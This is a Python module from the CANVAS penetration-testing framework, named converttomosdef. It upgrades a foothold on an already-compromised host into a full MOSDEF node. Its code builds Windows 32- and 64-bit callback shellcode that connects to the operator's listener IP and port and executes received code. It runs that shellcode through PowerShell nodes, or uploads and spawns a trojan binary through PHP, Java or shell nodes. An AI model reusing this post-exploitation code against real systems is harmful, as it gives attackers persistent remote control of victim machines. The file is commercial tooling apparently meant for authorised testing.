#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
import canvasengine
import time
import base64

from canvasexploit import canvasexploit
from shellcode.standalone.windows import payloads64
from ExploitTypes.localcommand import LocalCommand
import logging

NAME                    = "converttomosdef"
DESCRIPTION             = "Builds, uploads and runs a MOSDEF callback trojan. This is useful when you have a less full-featured Node such as a PHP ScriptNode, JavaNode or UnixShell, and want the full MOSDEF capability."
DOCUMENTATION           = {}
DOCUMENTATION["Notes"] ="""
This module will attempt to start a new MOSDEF Node after you have broken in with a PHP or Java exploit.
It does this by compiling up and uploading a binary (for the correct platform).
"""
VERSION                 = "1.0"

PROPERTY                = {}
PROPERTY['TYPE']        = "Commands"
PROPERTY['SITE']        = "Local"
PROPERTY['ARCH']        = [ ["Unix"], ["Windows"] ]


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result = ""
        self.name   = NAME
        self.subesp = 0

    def init_listener(self):
        def getSol(os):
            if os.arch.lower() in ['x86', 'i386']:
                return canvasengine.SOLARISMOSDEF_INTEL
            else:
                return canvasengine.SOLARISMOSDEF_SPARC

        def getOSX(os):
            arch = os.arch.lower()

            if arch == 'x86':
                return canvasengine.OSXMOSDEF_INTEL
            elif arch == 'x64':
                return canvasengine.OSXMOSDEF_X64
            else:
                raise Exception('Unknown OSX arch: %s' % arch)

        def getLinux(os):
            arch = os.arch.lower()

            if arch == 'x86':
                return canvasengine.LINUXMOSDEF_INTEL
            elif arch == 'x64':
                return canvasengine.LINUXMOSDEF_X64
            else:
                raise Exception('Unknown Linux arch: %s' % arch)

        def getWindows(os):
            arch = os.arch.lower()

            if arch in ['x86', 'i386']:
                return canvasengine.WIN32MOSDEF_INTEL
            elif arch == 'x64':
                return canvasengine.WIN64MOSDEF_INTEL
            else:
                raise Exception('Unknown Windows arch: %s' % arch)

        passednodes = self.argsDict["passednodes"]
        listenerMap = { "WINDOWS" : getWindows,
                        "LINUX"   : getLinux,
                        "SOLARIS" : getSol,
                        "OSX"     : getOSX,
                      }

        rv = []
        for n in passednodes:
            if not hasattr(n,"getHostOS"):
                logging.error("Node %s is not able to convert to a MOSDEF node! Did you select a LocalNode?" % n.get_name())
                continue
            target_os = n.getHostOS()
            logging.info("Initializing Listener for target OS: %s"%target_os)
            if target_os.base.upper() in listenerMap.keys():
                if callable(listenerMap[target_os.base.upper()]):
                    l = listenerMap[target_os.base.upper()](target_os)
                
                if l not in rv:
                    rv.append(l)
            else:
                logging.warning("No listener type is configured for os %s on node %s" % (target_os, n.get_name()))
        
        if len(rv) > 1:
            logging.warning("More than one listener type required (%s), which isn't supported yet, sorry. You'll probably only get some of your shells." % repr(rv))

        # force the use of the hand selected interface for more intuitivenesssissirty
        if rv and not self.callback and self.engine:
            self.callback = self.engine.autoListener(self, rv[0], host = self.target.interface, autoFind = False)

        if not rv:
            devlog("converttomosdef", "initlistener: rv is empty list!")
            logging.error("initlistener: rv is empty list!")

        return rv

    def setup_mosdef_shellcode(self, nodetype):
        host = self.callback.ip
        port = self.callback.port
        
        if nodetype == "win32Node":
            self.log("Creating win32 shellcode to callback to %s:%s" % (host,port))

            from shellcode import shellcodeGenerator
            sc = shellcodeGenerator.win32()
            sc.vProtectSelf = True
            sc.addAttr("findeipnoesp",{"subespval": 0}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
            sc.addAttr("loadFDasreg", {"reg" : "esi"})
            
            sc.addAttr("RecvExecDepSafe", None) #MOSDEF
            sc.addAttr("ExitThread", None)
            self.shellcode = sc.get()
        elif nodetype == "win64Node":
            self.log("Creating win64 shellcode to callback to %s:%s" % (host,port))
            p = payloads64.payloads()
            asm = p.callback(host, port, universal=False)
            bin = p.assemble(asm)
            self.shellcode = bin


    def run(self):
        self.setInfo("%s (in progress)"%(NAME))

        self.init_listener()

        node        = self.argsDict["passednodes"][0]
        self.result = []

        for node in self.argsDict["passednodes"]:
            nodetype = node.nodetype
            logging.info("nodetype:%s" %  nodetype)
            logging.info("nodetype.upper():%s" % nodetype.upper())

            if nodetype.upper() in ["JAVANODE", "SCRIPTNODE", "UNIXSHELLNODE"]: # What about SQLNode?
                if not hasattr(node,"getHostOS"):
                    logging.error("Node does not have an OS!")
                    continue
                target_os = node.getHostOS()
                if target_os != None:
                    fn = self.uploadmosdeftrojan(target_os=target_os, node=node)
                    if fn not in [0, False]:
                        logging.info("Running mosdef callback command:%s" % fn)
                        if node.capabilities.count("spawn"):
                            logging.info("Remote node supports spawn!")
                            r = node.spawn(fn)
                            succeeded = self.ISucceeded() #have to call this to check for the callback on remote nodes!
                        else:
                            logging.warning("After this command, the Node will be stuck!")
                            r = node.runcommand(fn)
                            # can't call self.ISucceeded here, as we're stuck! (This will fail to bounce!
                            succeeded = self.ISucceeded()
                        logging.info("Run command returned: %s" % r)
                        self.result.append(1)
                    else:
                        logging.error("Failed to build and upload trojan for node %s" % node.get_name())
                else:
                    logging.error("No OS information in knowledge for node %s" % node.get_name())
                    self.result += [0]
            elif nodetype.upper() == "POWERSHELLNODE":
                target_os = node.getHostOS()
                node_type = "win64Node" if "64" in target_os.arch else "win32Node"

                self.setup_mosdef_shellcode(node_type)
                
                node.shell.execute_shellcode(base64.b64encode("".join(["0x%02x," % (ord(byte)) for byte in self.shellcode])))
                
                succeeded = self.ISucceeded()
                self.result.append(1)
            else:
                logging.error("The node named %s of type %s does not have the capabilities needed to run this command"%(node.get_name(),nodetype))
                self.result+=[0]

        if 1 in self.result:
            ret = 1
        else:
            ret = 0

        self.setInfo("%s - (finished)" % (NAME))
        return ret

